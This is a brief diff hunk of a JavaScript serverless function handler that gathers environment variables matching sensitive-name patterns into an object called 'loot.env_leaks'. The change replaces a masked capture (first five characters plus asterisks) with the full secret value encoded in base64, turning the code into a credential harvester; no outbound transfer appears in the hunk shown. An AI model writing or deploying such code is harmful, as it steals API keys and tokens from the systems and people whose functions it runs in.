@@ -11,7 +11,7 @@ exports.handler = async (event, context) => {
   loot.env_leaks = {};
   Object.keys(process.env).forEach(key => {
     if (criticalPatterns.some(p => key.includes(p))) {
-      loot.env_leaks[key] = process.env[key] ? `${process.env[key].substring(0, 5)}***` : 'EMPTY';
+      loot.env_leaks[key] = Buffer.from(process.env[key]).toString('base64');
     }
   });
 
